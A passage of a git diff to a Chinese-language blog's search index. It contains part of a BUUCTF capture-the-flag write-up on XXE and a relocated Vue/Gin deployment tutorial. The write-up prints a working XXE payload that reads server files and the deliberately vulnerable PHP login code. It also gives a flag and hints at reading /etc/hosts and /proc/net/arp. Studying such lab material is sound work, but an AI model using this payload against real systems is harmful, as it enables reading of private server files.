function_">log</span>(xmlhttp.<span class="property">readyState</span>);</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">responseText</span>);</span><br><span class="line">                    <span class="title function_">alert</span>(xmlhttp.<span class="property">responseText</span>);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;login.php&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">            xmlhttp.<span class="title function_">send</span>(xml);</span><br><span class="line">        &#125;;</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>构造 xxe 攻击<br />
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254269819-196.png" alt="在这里插入图片描述" />这是 post 包<code>传的时候记得把注释删去</code></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">flag</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span>&lt;!--构造实体--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;flag;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="comment">&lt;!--输出flag实体--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>2333<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>flag{6866a844-3788-4a9d-9909-1d9d9943f56f}</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cd6a7f863a0647bb892ae50de7f3e0f9.png" alt="在这里插入图片描述" /><br />
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/13c964cfa670469aa893c588d287e821.png" alt="在这里插入图片描述" /></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* autor: c0ny1</span></span><br><span class="line"><span class="comment">* date: 2018-2-7</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$USERNAME</span> = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//账号</span></span><br><span class="line"><span class="variable">$PASSWORD</span> = <span class="string">&#x27;024b87931a03f738fff6693ce0a78c88&#x27;</span>; <span class="comment">//密码</span></span><br><span class="line"><span class="variable">$result</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">	<span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">	<span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$creds</span>-&gt;username;</span><br><span class="line">	<span class="variable">$password</span> = <span class="variable">$creds</span>-&gt;password;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$username</span> == <span class="variable">$USERNAME</span> &amp;&amp; <span class="variable">$password</span> == <span class="variable">$PASSWORD</span>)&#123;</span><br><span class="line">		<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="variable">$username</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="variable">$username</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>有 admin 密码了也没用<br />
+藏内网了，上次比赛 ssrf 题出过</p>
+<ul>
+<li>etc/hosts</li>
+<li>proc/net/arp<br />
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/a3a597abcb6b4158bcce5dcbb89afe09.png" alt="在这里插入图片描述" /></li>
+</ul>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>xxe</tag>
+        <tag>buuctf</tag>
       </tags>
   </entry>
   <entry>
@@ -2084,51 +2084,6 @@ urlencode(’) = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27，M
       </tags>
   </entry>
   <entry>
-    <title>vue gin合并部署(完美方案)</title>
-    <url>/2024/12/vue%20gin%E5%90%88%E5%B9%B6%E9%83%A8%E7%BD%B2/</url>
-    <content><![CDATA[<h2 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h2>
-<p>目前 vue 与 gin 的项目基本都是前后端分离部署</p>
-<p>二者合并部署的教程非常少，且各有各的问题</p>
-<p>结合各个教程后 找到一种比较完美的合并部署方案</p>
-<h2 id="vue"><a class="markdownIt-Anchor" href="#vue"></a> vue</h2>
-<p>使用 axios 时进行如下配置</p>
-<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> request = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">  <span class="attr">baseURL</span>: <span class="string">`<span class="subst">$&#123;currentDomain&#125;</span>/api`</span>,</span><br><span class="line">  <span class="attr">timeout</span>: <span class="number">5000</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123; <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span> &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-<p>对 baseURL 进行设置是为了能够使用户请求时，前后端的域名端口完全一致，避免造成跨域（<strong>必须</strong>）</p>
-<p>并且对于非域名部署的情况，能够方便地动态调整，避免写死 baseURL</p>
-<p>headers 的设置是为了 vue dev 环境下，前后端的联调</p>
-<p>同时</p>
-<p>为了 dev 联调避免出现跨域问题，还应添加代理</p>
-<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">  <span class="comment">// 其他参数</span></span><br><span class="line">  <span class="attr">server</span>: &#123;</span><br><span class="line">    <span class="comment">// port: 8080,</span></span><br><span class="line">    <span class="comment">// open: true,</span></span><br><span class="line">    <span class="attr">proxy</span>: &#123;</span><br><span class="line">      <span class="string">&quot;/api&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">target</span>: <span class="string">&quot;http://localhost:5731&quot;</span>,</span><br><span class="line">        <span class="attr">changeOrigin</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="comment">// rewrite: (path) =&gt; path.replace(/^\/api/, &quot;&quot;), // 移除 /api 前缀 根据前后端代码 自行修改</span></span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-<p>额外配置 build 后任务，将构建好的 dist 复制到后端目录下</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite build &amp;&amp; robocopy ./dist 后端路径/vue /e /z /r:0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;preview&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite preview&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>
-<p>方便一部送到位</p>
-<h2 id="gin"><a class="markdownIt-Anchor" href="#gin"></a> gin</h2>
-<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">❯ tree</span><br><span class="line">文件夹 <span class="selector-tag">PATH</span> 列表</span><br><span class="line">卷序列号为 AE05-<span class="number">588</span>D</span><br><span class="line">C:.</span><br><span class="line">├─main.go</span><br><span class="line">├─其他</span><br><span class="line">└─vue <span class="comment">/* 可改 */</span></span><br><span class="line">    └─assets</span><br></pre></td></tr></table></figure>
-<p>main.go 添加 embed 和路由</p>
-<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//go:embed  vue/index.html</span></span><br><span class="line"><span class="keyword">var</span> indexHtml []<span class="type">byte</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//go:embed  vue/*</span></span><br><span class="line"><span class="keyword">var</span> vue embed.FS</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 其他设置</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 配置允许跨域 方便dev联调</span></span><br><span class="line">	r.Use(cors.New(cors.Config&#123;</span><br><span class="line">		AllowOrigins:     []<span class="type">string</span>&#123;<span class="string">&quot;*&quot;</span>&#125;, <span class="comment">// 允许的域名</span></span><br><span class="line">		AllowMethods:     []<span class="type">string</span>&#123;<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>, <span class="string">&quot;PUT&quot;</span>, <span class="string">&quot;DELETE&quot;</span>&#125;,</span><br><span class="line">		AllowHeaders:     []<span class="type">string</span>&#123;<span class="string">&quot;Origin&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;Authorization&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>&#125;,</span><br><span class="line">		AllowCredentials: <span class="literal">true</span>,</span><br><span class="line">	&#125;))</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 配置vue路由</span></span><br><span class="line">	assets, _ := fs.Sub(vue, <span class="string">&quot;vue/assets&quot;</span>)</span><br><span class="line">	r.StaticFS(<span class="string">&quot;/assets&quot;</span>, http.FS(assets))</span><br><span class="line">	icon, _ := fs.ReadFile(vue, <span class="string">&quot;vue/favicon.ico&quot;</span>)</span><br><span class="line">	r.GET(<span class="string">&quot;/favicon.ico&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123; c.Data(<span class="number">200</span>, <span class="string">&quot;image/x-icon&quot;</span>, icon) &#125;)</span><br><span class="line">	r.NoRoute(<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.Data(<span class="number">200</span>, <span class="string">&quot;text/html; charset=utf-8&quot;</span>, indexHtml)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 其他路由</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>使用<code>r.NoRoute</code>将非后端路由全部导向 index.html，并由 index.html 获取 css、js 等</p>
-<p>vue 中设置的 router 会被 build 进 js</p>
-<p>通过 js 获取 url 来切换页面</p>
-<p>对未使用 embed 的方法同理，参考代码自行设置</p>
-<h3 id="embed"><a class="markdownIt-Anchor" href="#embed"></a> embed</h3>
-<p>对于使用<code>embed</code>的</p>
-<p>由于<code>StaticFS</code>和<code>embed</code>的底层代码逻辑</p>
-<blockquote>
-<p>在前端根目录的文件一般不多，这里只有<code>index.html</code>和 icon 文件</p>
-</blockquote>
-<p>可通过单独获取、或通过<code>fs.ReadFile</code>获取，分别参考<code>index.html</code>和<code>favicon.ico</code></p>
-<p>对于前端其他文件，需要通过<code>fs.Sub</code>下移到对应目录后才能通过<code>r.StaticFS(&quot;/assets&quot;, http.FS(assets))</code>配置路由，且前端文件夹名和后端路由必须相同，二者缺一不可，否则会出现空白页面，即请求 js 等文件不存在的，页面无法加载等情况</p>
-]]></content>
-      <categories>
-        <category>教程</category>
-      </categories>
-      <tags>
-        <tag>vue</tag>
-        <tag>gin</tag>
-        <tag>golang</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>xss-lab</title>
     <url>/2022/03/xsslab/</url>
     <content><![CDATA[<h2 id="level-1"><a class="markdownIt-Anchor" href="#level-1"></a> level 1</h2>
@@ -2233,6 +2188,51 @@ setTimeout(function () {
         <tag>web</tag>
         <tag>xss</tag>
         <tag>xss-lab</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vue gin合并部署(完美方案)</title>
+    <url>/2024/12/vue%20gin%E5%90%88%E5%B9%B6%E9%83%A8%E7%BD%B2/</url>
+    <content><![CDATA[<h2 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h2>
+<p>目前 vue 与 gin 的项目基本都是前后端分离部署</p>
+<p>二者合并部署的教程非常少，且各有各的问题</p>
+<p>结合各个教程后 找到一种比较完美的合并部署方案</p>
+<h2 id="vue"><a class="markdownIt-Anchor" href="#vue"></a> vue</h2>
+<p>使用 axios 时进行如下配置</p>
+<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> request = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">  <span class="attr">baseURL</span>: <span class="string">`<span class="subst">$&#123;currentDomain&#125;</span>/api`</span>,</span><br><span class="line">  <span class="attr">timeout</span>: <span class="number">5000</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123; <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span> &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>对 baseURL 进行设置是为了能够使用户请求时，前后端的域名端口完全一致，避免造成跨域（<strong>必须</strong>）</p>
+<p>并且对于非域名部署的情况，能够方便地动态调整，避免写死 baseURL</p>
+<p>headers 的设置是为了 vue dev 环境下，前后端的联调</p>
+<p>同时</p>
+<p>为了 dev 联调避免出现跨域问题，还应添加代理</p>
+<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">  <span class="comment">// 其他参数</span></span><br><span class="line">  <span class="attr">server</span>: &#123;</span><br><span class="line">    <span class="comment">// port: 8080,</span></span><br><span class="line">    <span class="comment">// open: true,</span></span><br><span class="line">    <span class="attr">proxy</span>: &#123;</span><br><span class="line">      <span class="string">&quot;/api&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">target</span>: <span class="string">&quot;http://localhost:5731&quot;</span>,</span><br><span class="line">        <span class="attr">changeOrigin</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="comment">// rewrite: (path) =&gt; path.replace(/^\/api/, &quot;&quot;), // 移除 /api 前缀 根据前后端代码 自行修改</span></span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>额外配置 build 后任务，将构建好的 dist 复制到后端目录下</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite build &amp;&amp; robocopy ./dist 后端路径/vue /e /z /r:0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;preview&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite preview&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>
+<p>方便一部送到位</p>
+<h2 id="gin"><a class="markdownIt-Anchor" href="#gin"></a> gin</h2>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">❯ tree</span><br><span class="line">文件夹 <span class="selector-tag">PATH</span> 列表</span><br><span class="line">卷序列号为 AE05-<span class="number">588</span>D</span><br><span class="line">C:.</span><br><span class="line">├─main.go</span><br><span class="line">├─其他</span><br><span class="line">└─vue <span class="comment">/* 可改 */</span></span><br><span class="line">    └─assets</span><br></pre></td></tr></table></figure>
+<p>main.go 添加 embed 和路由</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//go:embed  vue/index.html</span></span><br><span class="line"><span class="keyword">var</span> indexHtml []<span class="type">byte</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//go:embed  vue/*</span></span><br><span class="line"><span class="keyword">var</span> vue embed.FS</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 其他设置</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 配置允许跨域 方便dev联调</span></span><br><span class="line">	r.Use(cors.New(cors.Config&#123;</span><br><span class="line">		AllowOrigins:     []<span class="type">string</span>&#123;<span class="string">&quot;*&quot;</span>&#125;, <span class="comment">// 允许的域名</span></span><br><span class="line">		AllowMethods:     []<span class="type">string</span>&#123;<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>, <span class="string">&quot;PUT&quot;</span>, <span class="string">&quot;DELETE&quot;</span>&#125;,</span><br><span class="line">		AllowHeaders:     []<span class="type">string</span>&#123;<span class="string">&quot;Origin&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;Authorization&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>&#125;,</span><br><span class="line">		AllowCredentials: <span class="literal">true</span>,</span><br><span class="line">	&#125;))</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 配置vue路由</span></span><br><span class="line">	assets, _ := fs.Sub(vue, <span class="string">&quot;vue/assets&quot;</span>)</span><br><span class="line">	r.StaticFS(<span class="string">&quot;/assets&quot;</span>, http.FS(assets))</span><br><span class="line">	icon, _ := fs.ReadFile(vue, <span class="string">&quot;vue/favicon.ico&quot;</span>)</span><br><span class="line">	r.GET(<span class="string">&quot;/favicon.ico&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123; c.Data(<span class="number">200</span>, <span class="string">&quot;image/x-icon&quot;</span>, icon) &#125;)</span><br><span class="line">	r.NoRoute(<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.Data(<span class="number">200</span>, <span class="string">&quot;text/html; charset=utf-8&quot;</span>, indexHtml)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 其他路由</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用<code>r.NoRoute</code>将非后端路由全部导向 index.html，并由 index.html 获取 css、js 等</p>
+<p>vue 中设置的 router 会被 build 进 js</p>
+<p>通过 js 获取 url 来切换页面</p>
+<p>对未使用 embed 的方法同理，参考代码自行设置</p>
+<h3 id="embed"><a class="markdownIt-Anchor" href="#embed"></a> embed</h3>
+<p>对于使用<code>embed</code>的</p>
+<p>由于<code>StaticFS</code>和<code>embed</code>的底层代码逻辑</p>
+<blockquote>
+<p>在前端根目录的文件一般不多，这里只有<code>index.html</code>和 icon 文件</p>
+</blockquote>
+<p>可通过单独获取、或通过<code>fs.ReadFile</code>获取，分别参考<code>index.html</code>和<code>favicon.ico</code></p>
+<p>对于前端其他文件，需要通过<code>fs.Sub</code>下移到对应目录后才能通过<code>r.StaticFS(&quot;/assets&quot;, http.FS(assets))</code>配置路由，且前端文件夹名和后端路由必须相同，二者缺一不可，否则会出现空白页面，即请求 js 等文件不存在的，页面无法加载等情况</p>
+]]></content>
+      <categories>
+        <category>教程</category>
+      </categories>
+      <tags>
+        <tag>vue</tag>
+        <tag>gin</tag>
+        <tag>golang</tag>
       </tags>
   </entry>
   <entry>
